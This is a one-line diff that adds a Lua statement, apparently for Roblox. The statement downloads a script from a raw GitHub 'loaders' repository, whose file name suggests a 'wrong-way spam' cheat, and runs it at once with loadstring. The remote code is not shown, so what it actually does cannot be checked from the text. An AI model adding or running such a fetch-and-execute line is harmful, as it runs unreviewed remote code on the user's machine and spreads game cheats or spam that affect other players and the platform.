@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/rally-wrong-way-spam1-izthzwzte08gcd.lua"))()
